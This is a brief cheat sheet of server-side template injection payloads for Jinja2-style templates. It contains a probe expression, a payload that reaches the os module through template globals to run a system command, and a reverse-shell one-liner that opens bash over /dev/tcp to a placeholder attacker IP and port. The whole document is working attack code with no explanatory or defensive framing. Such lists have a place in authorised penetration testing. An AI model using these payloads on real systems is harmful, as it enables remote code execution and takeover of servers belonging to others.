# SSTI Payloads

## Test Payloads
```
{{ 7 * 7 }}
```
```
Test for System Execution
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
## Shell Payloads
### Rev-Shell Onliners
```
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"').read() }}
```
